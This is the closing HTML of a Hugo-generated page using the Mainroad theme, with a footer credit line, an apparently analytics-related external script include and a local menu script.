			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>